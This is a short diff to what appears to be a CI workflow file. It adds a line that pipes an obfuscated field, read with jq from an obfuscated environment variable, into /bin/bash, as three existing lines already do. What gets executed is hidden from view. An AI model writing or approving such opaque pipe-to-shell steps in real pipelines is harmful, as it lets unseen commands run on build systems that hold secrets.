@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$joltc39221" | jq -r .oijhw32238 | /bin/bash
           printf '%s' "$w70011" | jq -r .kfn07712 | /bin/bash
           echo $eq87 | jq -r .vycdy2 | /bin/bash
+          printf '%s' "$tcm4" | jq -r .xgpq371 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
